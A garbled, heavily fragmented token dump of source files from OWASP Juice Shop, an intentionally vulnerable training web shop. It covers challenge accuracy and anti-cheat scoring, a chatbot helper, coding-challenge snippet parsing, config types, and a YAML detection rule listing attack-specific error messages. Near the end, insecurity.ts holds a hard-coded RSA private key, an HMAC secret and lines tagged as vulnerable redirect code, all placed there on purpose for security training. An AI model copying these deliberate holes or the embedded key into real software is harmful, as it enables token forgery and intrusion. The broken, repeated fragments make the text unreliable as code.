https://www.npmjs.com/package/@cyclonedx/webpack-plugin// @see ... -plugin The path is relative to webpack's overall output path,// The  ... t path,CycloneDxWebpackPlugin'@cyclonedx/webpack-plugin'outputLocation'../bom'includeWellknownconst { ... lugin'){ Cyclo ... lugin'){ Cyclo ... lugin }Cyclone ... kPluginrequire ... lugin')'@cyclo ... plugin'{\r\n  pl ... \n  ]\r\n}plugins ... })\r\n  ]new Cyc ... \n    })outputL ... ../bom'../bom/bominclude ... : falseP:/My Drive/Git/juice-shop/ftp/suspicious_errors.ymlP:/My Drive/Git/juice-shop/ftpSuspicious error messages specific to the applicationSuspici ... icationDetects error messages that only occur from tampering with or attacking the applicationDetects ... icationlogsourcenodejscategor ... icationdetectionkeywordsBlocked illegal activity'Blocke ... tivity'* with id=* does not exist'* with ...  exist'Only * files are allowed'Only * ... llowed'File names cannot contain forward slashes'File n ... lashes'Unrecognized target URL for redirect: *'Unreco ... ect: *'B2B customer complaints via file upload have been deprecated for security reasons'B2B cu ... easons'Infinite loop detected'Infini ... tected'Detected an entity reference loop'Detect ... e loop'- 'Bloc ... tivity'keywords:title:  ... icationP:/My Drive/Git/juice-shop/lib/accuracy.tsP:/My Drive/Git/juice-shop/lib
 * Copyright (c) 2014-2021 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 './logger''colors/safe'solves'find it''fix it'attemptsPhasestoreFindItVerdictstoreVerdictstoreFixItVerdictcalculateFindItAccuracycalculateAccuracycalculateFixItAccuracytotalFindItAccuracytotalAccuracytotalFixItAccuracygetFindItAttemptsphasesumAccuracytotalSolved`Accuracy for '${'Fix It''Find It'}' phase of coding challenge ${./logger/loggerimport  ... s/safe'colors/safeconst s ... }> = {}solves: ... }> = {}Record< ... er } }>{ 'find ... ber } }'find it': boolean,find it'fix it': boolean,fix itattempt ... umber }{ 'find ... umber }'find it': number,'fix it': numbertype Ph ... fix it''find it' | 'fix it'export  ... ict)\r\n}const s ... ict)\r\n}storeFi ... ict)\r\n}(challe ... ict)\r\n}{\r\n  st ... ict)\r\n}storeVe ... erdict)export  ... it')\r\n}const c ... it')\r\n}calcula ... it')\r\n}calcula ... ccuracy(challe ... it')\r\n}{\r\n  re ... it')\r\n}return  ... nd it')calcula ... nd it')return  ... ix it')calcula ... ix it')const t ... it')\r\n}totalFi ... it')\r\n}() => { ... it')\r\n}totalAc ... nd it')totalAc ... ix it')export  ...  : 0\r\n}const g ...  : 0\r\n}getFind ...  : 0\r\n}(challe ...  : 0\r\n}{\r\n  re ...  : 0\r\n}return  ... t'] : 0solves[ ... t'] : 0solves[challengeKey]solves[ ... nd it']solves[ ... ttemptsfunctio ... lved\r\n}{\r\n  le ... lved\r\n}let sumAccuracy = 0sumAccuracy = 0let totalSolved = 0totalSolved = 0Object. ... forEachObject. ... solves)([key,  ...  }\r\n  }[key, value]value[phase]sumAccu ... [phase]1 / val ... [phase]value.a ... [phase]value.attemptstotalSolved++return  ... lSolvedsumAccu ... lSolvedfunctio ... racy\r\n}{\r\n  le ... racy\r\n}let accuracy = 0accuracy = 0if (sol ... e]\r\n  }solves[ ... [phase]accurac ... [phase]1 / sol ... [phase]logger. ... ()))}`)`Accura ... g()))}`Accuracy for 'phase = ... ind It'phase === 'fix it'Fix ItFind It' phase ... llenge ' phase of coding challenge colors. ... ngeKey)accurac ... ing()))accuracy > 0.5colors. ... ring())colors.greenaccuracy.toString()accuracy.toString(accura ... ing()))accurac ... ring())accuracy > 0.25colors.yellowcolors.redreturn accuracyif (!so ...  }\r\n  }!solves ... ngeKey]solves[ ... : 0 } }{ 'find ... : 0 } }'find it': false'fix it': falseattempt ... t': 0 }{ 'find ... t': 0 }'find it': 0'fix it': 0if (!so ... ++\r\n  }!solves ... [phase]{\r\n     ... ++\r\n  }solves[ ... verdictsolves[ ... hase]++P:/My Drive/Git/juice-shop/lib/antiCheat.ts @ts-expect-error FIXME due to non-existing type definitions for median// @ts- ...  median TODO prevent also near-identical challenges (e.g. all null byte file access or dom xss + bonus payload etc.) from counting as cheating// TODO ... heating seed with server start timestamp// seed ... mestamp @ts-expect-error FIXME any type issues// @ts- ...  issues don't compare to itself// don' ...  itselfretrieveCodeSnippet'../routes/vulnCodeSnippet'readFixes'../routes/vulnCodeFixes''../data/types'getCodeChallenges'./codingChallenges''./utils'median'median'coupledChallenges'weakPasswordChallenge''easterEggLevelOneChallenge''forgottenDevBackupChallenge''forgottenBackupChallenge''misplacedSignatureFileChallenge''uploadTypeChallenge''xxeFileDisclosureChallenge''xxeDosChallenge''uploadSizeChallenge'trivialChallenges'errorHandlingChallenge''privacyPolicyChallenge''closeNotificationsChallenge'cheatScore'server start'preSolveInteractionsurlFragmentsinteractions'missingEncodingChallenge''/assets/public/images/uploads/%F0%9F%98%BC-''/ftp/eastere.gg''easterEggLevelTwoChallenge''/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt''/ftp/package.json.bak''/ftp/coupons_2013.md.bak''loginSupportChallenge''/ftp/incident-support.kdbx''/ftp/suspicious_errors.yml''recChallenge''/b2b/v2/orders''rceOccupyChallenge'checkForPreSolveInteractionspreSolveInteractioncalculateCheatScoretimeFactor'hackingInstructor.isEnabled'areCoupledpreviousisTrivialminutesExpectedToSolveminutesSincePreviousSolvepercentPrecedingInteractionmultiplierForMissingExpectedInteraction`Cheat score for ${'coupled ''trivial ''tutorial '} solved in ${}min (expected ~${}min) with${'out'} hints allowed${' and ''% expected preceding URL interaction'0.66'hack it'calculateFindItCheatScorecodeSnippetidenticalSolvedcheckForIdenticalSolvedChallenge`Cheat score for "Find it" phase of ${}min): ${calculateFixItCheatScore`Cheat score for "Fix it" phase of ${totalCheatScorepreviousChallengecodingChallengescodingChallengesToCompareTosnippetToCompareToimport  ... nippet''../rou ... nippet'../routes/vulnCodeSnippet/routes/vulnCodeSnippetimport  ... eFixes''../rou ... eFixes'../routes/vulnCodeFixes/routes/vulnCodeFixes../data/types/data/types./codingChallenges/codingChallengesimport  ... xpress'type NextFunctiontype Requesttype Response./utils/utilsimport  ... median'const c ... ge']\r\n}coupled ... ge']\r\n}{ // TO ... ge']\r\n}loginAd ... lenge']['weakP ... lenge']'weakPa ... llenge'nullByt ... lenge']['easte ... lenge']'easter ... llenge''forgot ... llenge''mispla ... llenge'depreca ... lenge']['uploa ... lenge']'upload ... llenge''xxeFil ... llenge'uploadS ... lenge']uploadT ... lenge']const t ... lenge']trivial ... lenge']['error ... lenge']'errorH ... llenge''privac ... llenge''closeN ... llenge'const s ... e: 0 }]solves: ... e: 0 }][{ chal ... e: 0 }]{ chall ... re: 0 }challenge: {}phase:  ...  start'server starttimesta ...  Date()cheatScore: 0Array<{ ... mber }>{ chall ... umber }challenge: any,phase: string,timestamp: Date,cheatScore: numberconst p ... e] }\r\n]preSolv ... e] }\r\n][\r\n  {  ... e] }\r\n]{ chall ... alse] }'missin ... llenge'urlFrag ... 8%BC-']['/asse ... 8%BC-']'/asset ... 98%BC-'/assets/public/images/uploads/%F0%9F%98%BC-interac ... [false][false]urlFrag ... '/ftp']['/ftp']urlFrag ... re.gg']['/ftp' ... re.gg']/ftp/eastere.gg/ftp/easteregginterac ...  false][false, false]urlFrag ... e/rtt']['/ftp' ... e/rtt']'/gur/q ... re/rtt'/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtturlFrag ... n.bak']['/ftp' ... n.bak']'/ftp/p ... on.bak'/ftp/package.json.bak/ftp/packagebakurlFrag ... d.bak']['/ftp' ... d.bak']'/ftp/c ... md.bak'/ftp/coupons_2013.md.bak/ftp/coupons_2013md'loginS ... llenge'urlFrag ... .kdbx']['/ftp' ... .kdbx']'/ftp/i ... t.kdbx'/ftp/incident-support.kdbx/ftp/incident-supportkdbxurlFrag ... s.yml']['/ftp' ... s.yml']'/ftp/s ... rs.yml'/ftp/suspicious_errors.yml/ftp/suspicious_errorsrecChallengeurlFrag ... rders']['/api- ... rders']/b2b/v2/ordersArray<{ ... an[] }>{ chall ... ean[] }challengeKey: any,urlFrag ... ring[],interac ... olean[]boolean[]export  ... xt()\r\n}const c ... xt()\r\n}checkFo ... xt()\r\n}checkFo ... actions() => ( ... xt()\r\n}({ url  ... xt()\r\n}{ url }{\r\n  pr ... xt()\r\n}preSolv ... }\r\n  })preSolv ... forEach(preSol ...  }\r\n  }i < pre ... .lengthpreSolv ... .lengthpreSolv ... agmentsutils.e ... nts[i])utils.endsWithpreSolv ... ents[i]preSolv ...  = truepreSolv ... ions[i]preSolv ... actionsnext()export  ... core\r\n}const c ... core\r\n}calcula ... core\r\n}(challe ... core\r\n}{\r\n  co ... core\r\n}const t ...  Date()let cheatScore = 0cheatScore = 0let timeFactor = 2timeFactor = 2timeFac ...  : 1.5)(config ...  : 1.5)config. ... 1 : 1.5timeFac ... .5 : 1)(challe ... .5 : 1)challen ... 0.5 : 1challen ... abled')config. ... abled')'hackin ... nabled'hackingInstructor.isEnabledif (are ...  0\r\n  }areCoup ... llenge)previous().challengeprevious()isTrivial(challenge){\r\n     ...  0\r\n  }timeFactor = 0const m ... eFactorminutes ... eFactorminutes ... ToSolvechallen ... eFactorconst m ... / 60000minutes ... / 60000minutes ... usSolve(timest ... / 60000(timest ... Time())timesta ... tTime()timestamp.getTime()timestamp.getTimepreviou ... tTime()previou ... getTimeprevious().timestampcheatSc ... Solve))Math.ma ... Solve))1 - (mi ... oSolve)(minute ... oSolve)const p ... ge.key)preSolv ... ge.key)preSolv ... ns.find(preSol ... nge.keypreSolv ... nge.keypreSolv ... engeKeylet per ... on = -1percent ... on = -1percent ... ractionif (pre ... e)\r\n  }percent ... length)preSolv ... length)preSolv ... oolean)preSolv ... .filter(preSol ... length)const m ... on) / 2multipl ... on) / 2multipl ... raction1 + Mat ... on) / 2Math.ma ... on) / 2Math.ma ... action)1 - per ... ractioncheatSc ... ractioncheatSc ... tScore)Math.mi ... tScore)`Cheat  ... g()))}`Cheat score for areCoup ... ' : '')coupled (isTriv ... ' : '')isTrivi ...  ' : ''trivial challen ...  ' : ''tutorial colors. ... ge.key) solved in Math.ro ... sSolve)min (expected ~min) withconfig. ... : 'out'out hints allowedpercent ... ') : ''percent ... on > -1(' and  ... ction')' and ' ... action'' and ' ... n * 100 and percent ... n * 100'% expe ... action'% expected preceding URL interactioncheatSc ... ing()))cheatScore < 0.33cheatSc ... tring()cheatScore.toString(cheatS ... ing()))cheatSc ... ring())cheatScore < 0.66solves. ... core })solves.push{ chall ... Score }phase: 'hack it'hack itreturn cheatScorecalcula ... atScoreasync ( ... core\r\n}let tim ... = 0.001timeFactor = 0.001const c ... ge.key)codeSni ... ge.key)await r ... ge.key)retriev ... ge.key)if (cod ...  0\r\n  }codeSnippet == null{\r\n    return 0\r\n  }return 0const { ... Snippet{ snipp ... Snippet{ snipp ... Lines }timeFac ... .lengthvulnLines.lengthconst i ... llenge)identic ... llenge)await c ... llenge)checkFo ... llenge)checkFo ... allengeif (ide ... or\r\n  }{\r\n     ... or\r\n  }timeFac ... eFactor0.8 * timeFactorconst m ... Factor)minutes ... Factor)Math.ce ... Factor)snippet ... eFactorsnippet.lengthCheat s ... ase of Cheat score for "Find it" phase of min): phase: 'find it'const { ... ge.key){ fixes ... ge.key){ fixes }readFix ... ge.key)const m ... th / 2)minutes ... th / 2)Math.fl ... th / 2)fixes.length / 2fixes.lengthCheat score for "Fix it" phase of phase: 'fix it'const t ...  : 0\r\n}totalCh ...  : 0\r\n}() => { ...  : 0\r\n}return  ... e)) : 0solves. ... e)) : 0solves.length > 1solves.lengthmedian( ... Score))solves. ... tScore)solves.map({ chea ... atScore{ cheatScore }functio ... > -1\r\n}{\r\n  // ... > -1\r\n}return  ... y) > -1coupled ... y) > -1coupled ... ge.key)coupled ... indexOfcoupled ... ge.key]previou ... nge.keyfunctio ... key)\r\n}{\r\n  re ... key)\r\n}return  ... ge.key)trivial ... ge.key)trivial ... ncludesfunctio ... - 1]\r\n}{\r\n  re ... - 1]\r\n}return  ... th - 1]solves[ ... th - 1]solves.length - 1const c ... alse\r\n}checkFo ... alse\r\n}async ( ... alse\r\n}Promise<boolean>{\r\n  co ... alse\r\n}const c ... enges()codingC ... enges()await g ... enges()getCodeChallenges()if (!co ... se\r\n  }!coding ... ge.key)codingC ... ge.key)codingChallenges.hascodingC ... mpareTocodingChallenges.get!coding ... snippetcodingC ... snippetconst s ... snippetsnippet ... snippetcodingC ... tries()codingC ... entriesconst [ ... ppet }][challe ... ppet }]{ snippet }if (sni ... \r\n    }snippet ... mpareToconst s ... llengesif (sol ...       }solvedC ... ind it'solvedC ... s.phaseP:/My Drive/Git/juice-shop/lib/botUtils.tsfuzz'fuzzball''../data/datacache''./insecurity'challengeUtils'./challengeUtils'productPricequeriedProductspartial_ratio} costs ${}`'Sorry I couldn\'t find any products with that name'couponCodesolveIf`Oooookay, if you promise to stop nagging me here's a 10% coupon code for you: ${testFunction'3be2e438b7f3d04c89d7749f727bb3bd'import  ... zzball'fuzzball../data/datacache/data/datacache./insecurity/insecurityimport  ... eUtils'./challengeUtils/challengeUtils* as challengeUtilsconst p ... ndAll()product ... ndAll()await P ... ndAll()Product ... ndAll()ProductModel.findAllconst q ... ice}\u00a4`)queried ... ice}\u00a4`)product ... ice}\u00a4`)product ...    .mapproduct ... ) > 60)product ... .filter(produc ... e) > 60fuzz.pa ... e) > 60fuzz.pa ... t.name)fuzz.partial_ratio(produc ... rice}\u00a4``${prod ... rice}\u00a4` costs \u00a4return  ... e'\r\n  }body: q ... t name'queried ... t name'queried ... gth > 0queried ... .lengthqueried ... n(', ')queriedProducts.join'Sorry  ... t name'Sorry I couldn't find any products with that name{\r\n  ch ... \n  }\r\n}challen ... true })challen ... solveIf() => { ...  true }{ return true }return  ... }`\r\n  }body: ` ... n(10)}``Oooook ... n(10)}`Oooooka ... r you: Oooookay, if you promise to stop nagging me here's a 10% coupon code for you: securit ... pon(10)return  ... d'\r\n  }body: ' ... 7bb3bd''3be2e4 ... 7bb3bd'3be2e438b7f3d04c89d7749f727bb3bdP:/My Drive/Git/juice-shop/lib/challengeUtils.tsOp'sequelize'sanitizeHtml'sanitize-html''./antiCheat'webhook'./webhook''./accuracy'globalWithSocketIOglobalThisSocketIOClientStaticnotSolvedsolvesolvedChallenge'Restored''Solved'}-star ${sendNotification'Webhook notification failed: 'ctfFlag' ('allowedTagsallowedAttributes'challenges.showSolvedNotifications'wasPreviouslyShownsendCodingChallengeNotificationfindChallengeByName'Missing challenge with name: 'findChallengeByIdchallengeId'Missing challenge with id: 'solveFindItlt} 'Find It' phase of coding challenge ${solveFixIt} 'Fix It' phase of coding challenge ${import  ... uelize'import  ... e-html'import  ... iCheat'./antiCheat/antiCheatimport  ... ebhook'./webhook/webhook* as webhookimport  ... curacy'./accuracy/accuracy* as accuracyimport  ... ket.io'type Serverconst g ... rver\r\n}globalW ... rver\r\n}global  ... rver\r\n}typeof  ... rver\r\n}typeof globalThis{\r\n  io ... rver\r\n}io: Soc ...  ServerSocketI ...  Serverconst s ... \n  }\r\n}solveIf ... \n  }\r\n}() => anyif (not ... e)\r\n  }notSolv ... teria()notSolved(challenge)criteria()solve(c ... estore)solve = ...   })\r\n}{\r\n  ch ...   })\r\n}challen ...  = truechallen ... }\r\n  })challen ... ().thenchallenge.save()challenge.save(solved ...  }\r\n  }{ diffi ... tring }difficulty: number,key: string,logger. ... ame})`)`${isRe ... name})`isResto ... olved')colors. ... tored')colors.greyRestoredcolors. ... olved')solvedC ... ficulty-star solvedChallenge.keysolvedChallenge.namesendNot ... estore)if (!is ... \r\n    }!isRestorecheatSc ... llenge)calcula ... llenge)process ... WEBHOOKwebhook ...      })webhook ... ).catchwebhook ... tScore)webhook.notifylogger. ... rror)))'Webhoo ... error))'Webhoo ... iled: 'Webhook notification failed: colors. ... error))utils.g ... (error)sendNot ... \n  }\r\n}{ diffi ... : any }difficulty?: number,key: any,name: any,description?: anyif (!no ...  }\r\n  }!notSol ... llenge)const f ... e.name)flag =  ... e.name)utils.c ... e.name)utils.ctfFlagconst n ... \r\n    }notific ... \r\n    }key: challenge.keychallen ... ) + ')'challen ...  {} }))challen ...  + ' ('entitie ...  {} }))entities.decodesanitiz ... : {} }){ allow ... s: {} }allowedTags: []allowed ... tes: {}hidden: ... tions')!config ... tions')challenges.showSolvedNotificationsconst w ... ge.key)wasPrev ... ge.key)notific ... ge.key)notifications.some({ key  ... nge.key{ key }key === ... nge.keynotific ... cation)notifications.pushif (glo ... \r\n    }globalW ... yShown)globalW ... etIO.io(isRest ... yShown)isResto ... lyShown!wasPreviouslyShownglobalW ... cation)globalW ... io.emitsendCod ... \n  }\r\n}sendCod ... ication{ key:  ... 1 | 2 }if (cha ...  }\r\n  }challen ... tus > 0export  ... .solvedconst n ... .solvednotSolv ... .solvedexport  ... ame)\r\n}const f ... ame)\r\n}findCha ... ame)\r\n}(challe ... ame)\r\n}{\r\n  fo ... ame)\r\n}const cif (Obj ... \r\n    }Object. ... ges, c)Object. ... ty.callchallenges[c].namechallenges[c]return challenges[c]logger. ... geName)'Missin ... ngeName'Missin ... name: 'Missing challenge with name: export  ... eId)\r\n}const f ... eId)\r\n}findCha ... eId)\r\n}(challe ... eId)\r\n}{\r\n  fo ... eId)\r\n}challen ... lengeIdchallenges[c].idlogger. ... engeId)'Missin ... lengeId'Missin ... h id: 'Missing challenge with id: solveFi ... \n  }\r\n}const s ... es[key]solvedC ... es[key]challenges[key]await C ...  } } })Challen ...  } } })Challen ... .update{ codin ... us: 1 }{ where ... 2 } } }where:  ... : 2 } }{ key,  ... : 2 } }codingC ... t]: 2 }{ [Op.lt]: 2 }[Op.lt]: 2Op.lt 'Find  ... llenge  'Find It' phase of coding challenge if (!is ... })\r\n  }accurac ... , true)accurac ... Verdictaccurac ... ge.key)accurac ... ccuracysendCod ... s: 1 }){ key,  ... us: 1 }await C ... ey } })Challen ... ey } }){ codin ... us: 2 }{ where: { key } }where: { key } 'Fix I ... llenge  'Fix It' phase of coding challenge sendCod ... s: 2 }){ key,  ... us: 2 }P:/My Drive/Git/juice-shop/lib/codingChallenges.ts strings are split so that it doesn't find itself...// stri ... self... get all challenges which are in the file by a regex capture group// get  ... e group TODO Currently only a single code snippet is supported// TODO ... pported dont use directly, use getCodeChallenges getter// dont ...  getterSNIPPET_PATHS'./server.ts''./routes''./lib''./data''./data/static/web3-snippets''./frontend/src/app''./models'FileMatchCachedCodeChallengeneutralLinesfindFilesWithCodeChallengescurrPathmoreMatches'// vuln-code''-snippet start''# vuln-code'`File ${} could not be read. it might have been moved or deleted. If coding challenges are contained in the file, they will not be available.`getCodeChallengesFromFilefileContentchallengeKeyRegex/[/#]{0,2} vuln-code-snippet start (?<challenges>.*)/ggetCodingChallengeFromFileContentsnippets`[/#]{0,2} vuln-code-snippet start.*${}([^])*vuln-code-snippet end.*${BrokenBoundary'Broken code snippet boundaries for: '/\s?[/#]{0,2} vuln-code-snippet start.*[\r\n]{0,2}/g/\s?[/#]{0,2} vuln-code-snippet end.*/g/.*[/#]{0,2} vuln-code-snippet hide-line[\r\n]{0,2}/g/.*[/#]{0,2} vuln-code-snippet hide-start([^])*[/#]{0,2} vuln-code-snippet hide-end[\r\n]{0,2}/g'\r\n''\r'`vuln-code-snippet vuln-line.*${`vuln-code-snippet neutral-line.*${/\s?[/#]{0,2} vuln-code-snippet vuln-line.*/g/\s?[/#]{0,2} vuln-code-snippet neutral-line.*/gsuper'BrokenBoundary'_internalCodeChallengesfilesWithCodeChallengesfileMatchcodeChallengeexport  ... dels'])const S ... dels'])SNIPPET ... dels'])Object. ... dels'])['./ser ... odels']./server.ts./routes/routes./lib/lib./data/data'./data ... ippets'./data/static/web3-snippets/data/static/web3-snippets./frontend/src/app/frontend/src/app./models/modelspath: stringcontent: stringinterfa ... er[]\r\n}vulnLines: number[]neutral ... umber[]export  ... ches\r\n}const f ... ches\r\n}findFil ... ches\r\n}findFil ... llengesasync ( ... ches\r\n}Promise<FileMatch[]>FileMatch[]readonly string[]{\r\n  co ... ches\r\n}const matches = []matches = []const currPathif ((aw ... \r\n    }(await  ... ctory()(await  ... rectory(await  ... rPath))await f ... rrPath)fs.lstat(currPath)const f ... rrPath)files = ... rrPath)fs.readdir(currPath)const m ...       )moreMat ...       )await f ...       )findFil ...       )files.m ...  file))files.mapfile => ... , file)path.re ... , file)matches ... atches)matches.push...moreMatchesconst c ... 'utf8')code =  ... 'utf8')await f ... 'utf8')fs.read ... 'utf8')code.in ... start')code.includes'// vul ...  start'// vuln-code-snippet start// vuln-code-snippet start'# vuln ...  start'# vuln-code# vuln-code-snippet startmatches ... code }){ path: ...  code }path: currPathcontent: codelogger. ... able.`)`File $ ... lable.`File  could  ... ilable. could not be read. it might have been moved or deleted. If coding challenges are contained in the file, they will not be available.return matchesfunctio ... ey))\r\n}getCode ... romFile{\r\n  co ... ey))\r\n}const f ... contentfileCon ... contentfile.contentconst c ... s>.*)/gchallen ... s>.*)/g/[/#]{0 ... s>.*)/g[/#]{0,2} vuln-code-snippet start (?<challenges>.*)[/#]{0,2}[/#] vuln-code-snippet start (?<challenges>.*)const c ... oolean)challen ... oolean)[...fil ... oolean)[...fil ... .filter[...fil ...  ?? [])[...fil ... flatMap[...fil ... Regex)]...file ... yRegex)fileCon ... yRegex)fileContent.matchAllmatch = ... ) ?? []match.g ... ) ?? []match.g ... it(' ')match.g ... ?.splitmatch.g ... llengesmatch.groupsreturn  ... geKey))challen ... geKey))(challe ... ngeKey)getCodi ... ngeKey)getCodi ... Contentfunctio ... es }\r\n}{\r\n  co ... es }\r\n}const s ... eKey}`)snippet ... eKey}`)source. ... eKey}`)source.match`[/#]{0 ... geKey}`[/#]{0, ... start.*[/#]{0,2} vuln-code-snippet start.*([^])*v ... t end.*([^])*vuln-code-snippet end.*if (sni ... y)\r\n  }snippets == nullthrow n ... ngeKey)new Bro ... ngeKey)'Broken ... engeKey'Broken ...  for: 'Broken code snippet boundaries for: let sni ... pets[0]snippet ... pets[0]snippets[0]snippet ... /g, '')snippet.replace/\s?[/# ... {0,2}/g\s?[/#]{0,2} vuln-code-snippet start.*[\r\n]{0,2}\s?\s vuln-code-snippet start[\r\n]{0,2}[\r\n]\r\n/\s?[/# ... end.*/g\s?[/#]{0,2} vuln-code-snippet end.* vuln-code-snippet end/.*[/#] ... {0,2}/g.*[/#]{0,2} vuln-code-snippet hide-line[\r\n]{0,2} vuln-code-snippet hide-line.*[/#]{0,2} vuln-code-snippet hide-start([^])*[/#]{0,2} vuln-code-snippet hide-end[\r\n]{0,2}([^])*([^])[^]snippet ... .trim()snippet.trim()snippet.trimlet lin ... '\r\n')lines = ... '\r\n')snippet ... '\r\n')snippet.split
if (lin ... t('\n')lines.length === 1lines = ... t('\n')snippet.split('\n')if (lin ... t('\r')lines = ... t('\r')snippet.split('\r')const vulnLines = []vulnLines = []const n ... es = []neutralLines = []for (le ...  }\r\n  }if (new ... \r\n    }new Reg ... != nullnew Reg ... nes[i])new Reg ... `).execnew Reg ... eKey}`)`vuln-c ... geKey}`vuln-co ... -line.*vuln-code-snippet vuln-line.*lines[i]vulnLin ... (i + 1)vulnLines.pushvuln-code-snippet neutral-line.*neutral ... (i + 1)neutralLines.push/\s?[/# ... ine.*/g\s?[/#]{0,2} vuln-code-snippet vuln-line.* vuln-code-snippet vuln-line\s?[/#]{0,2} vuln-code-snippet neutral-line.* vuln-code-snippet neutral-linereturn  ... Lines }{ chall ... Lines }constru ... ge\r\n  }{\r\n     ... ge\r\n  }super(message)this.na ... undary'let _in ...  = null_intern ...  = null_intern ... llengesMap<str ...  | nullMap<str ... llenge>export  ... nges\r\n}async f ... nges\r\n}Promise ... lenge>>{\r\n  if ... nges\r\n}if (_in ...  }\r\n  }_intern ... == null_intern ... enge>()new Map ... enge>()const f ... _PATHS)filesWi ... _PATHS)filesWi ... llengesawait f ... _PATHS)findFil ... _PATHS)const fileMatchgetCode ... eMatch)const codeChallenge_intern ...      })_intern ... ges.setcodeCha ... engeKeycodeCha ... snippetvulnLin ... lnLinescodeCha ... lnLinesneutral ... alLinescodeCha ... alLinesP:/My Drive/Git/juice-shop/lib/config.types.ts manually typed definitions for the config file// manu ... ig file todo(@jannik.hollenbach) migrate the config schema to something which can automatically generate the types// todo ... e typesServerConfigApplicationConfigChallengesConfig'never''always'safetyOverrideHackingInstructorConfig'faster''fast''slow''slower'CtfConfigAppConfigbasePath: stringbaseUrl: stringcustomM ...  stringchatBot ... ng\r\n  }greeting: stringtrainingData: stringdefault ...  stringavatar: stringsocial: ... ll\r\n  }nftUrl: ...  | nullquestio ...  | nullrecycle ... ng\r\n  }welcome ... ng\r\n  }cookieC ... ng\r\n  }securit ... ng\r\n  }hiring: stringcsaf: stringpromoti ... ng\r\n  }easterE ... ng\r\n  }googleO ... }>\r\n  }{\r\n     ... }>\r\n  }authori ... ring }>{ uri:  ... tring }uri: string,proxy?: stringcodingC ... always''never' ... always'xssBonu ...  stringsafetyO ... booleancsafHas ...  stringexport  ... wer'\r\n}interfa ... wer'\r\n}Hacking ... rConfighintPla ... slower''faster ... slower'deluxePrice?: numberlimitPe ...  numberreviews ... ring }>{ text: ... tring }text: string,urlForP ...  stringuseForC ... booleankeyword ... tring[]deletedDate?: stringfileFor ...  stringexifFor ... tring[]caption: stringuser?: stringgeoStal ...  numbergeoStal ...  stringexport  ...   }>\r\n}interfa ...   }>\r\n}showCou ...  'both''none'  ...  'both'country ... g\r\n  }>Record< ... g\r\n  }>code: stringexport  ... nfig\r\n}server: ServerConfigapplica ... nConfigchallen ... sConfighacking ... rConfigproducts: Product[]memories: Memory[]Memory[]ctf: CtfConfigP:/My Drive/Git/juice-shop/lib/insecurity.ts eslint-disable-next-line @typescript-eslint/prefer-ts-expect-error// esli ... t-error @ts-expect-error FIXME no typescript definitions for z85 :(// @ts- ...  z85 :( vuln-code-snippet start redirectCryptoCurrencyChallenge redirectChallenge vuln-code-snippet vuln-line redirectCryptoCurrencyChallenge vuln-code-snippet vuln-line redirectChallenge vuln-code-snippet end redirectCryptoCurrencyChallenge redirectChallengeexpressJwt'express-jwt'jwt'jsonwebtoken'jws'jws'sanitizeHtmlLibsanitizeFilenameLib'sanitize-filename'z85'z85'publicKey'encryptionkeys/jwt.pub''placeholder-public-key''-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----'ResponseWithUserIAuthenticatedUserstokenMapidMaptokenOfupdateFromhmac'sha256''pa4qacea4VK9t9nGv7yZtwmj'cutOffPoisonNullBytenullByte'%00'authorizeexpiresIn'6h''RS256'sanitizeLegacy/<(?:\w+)\W+?[\w]/gisanitizeFilenamesanitizeSecuresanitizedunquotejwtFromuserEmailFrom'x-user-email'toMMMYYdiscountFromCoupondecodedhasValidFormat/(JAN|FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DEC)[0-9]{2}-[0-9]{2}/decodedToken'Malicious activity detected'isCustomer401updateAuthenticatedUserscookiesimport fs from 'fs'import  ... crypto'type UserModelimport  ... ss-jwt'import  ... btoken'import  ... m 'jws'import  ... lename'sanitize-filenameimport  ... m 'z85'* as z85export  ... ic-key'const p ... ic-key'publicK ... ic-key'fs ? fs ... ic-key''encryp ... wt.pub'encryptionkeys/jwt.pubencryptionkeys/jwtpub'placeh ... ic-key'placeholder-public-keyconst p ... Y-----'private ... Y-----''-----B ... Y-----'-----BEGIN RSA PRIVATE KEY-----
